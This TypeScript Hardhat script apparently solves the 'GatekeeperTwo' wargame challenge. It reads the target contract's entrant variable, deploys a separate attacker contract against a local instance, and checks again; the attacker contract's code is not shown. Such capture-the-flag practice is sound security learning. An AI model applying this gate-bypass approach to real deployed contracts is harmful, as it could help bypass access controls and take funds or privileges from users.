import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x524F04724632eED237cbA3c37272e018b3A7967e";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("GatekeeperTwo", CONTRACT_ADDRESS, signer);

//HACK STEPS

// 1. Hack is being executed during deployment of attacker contract. 
// Check entrant state variable 
let entrant = await contract.entrant();
console.log("The entrant is now: ", entrant);

// 2. Deploy and check again. 
const attackerContractFactory = await ethers.getContractFactory("GatekeeperTwoAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);
console.log("Attacker contract deployed! ", attackerContract.address);
entrant = await contract.entrant();
console.log("The entrant is now: ", entrant);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
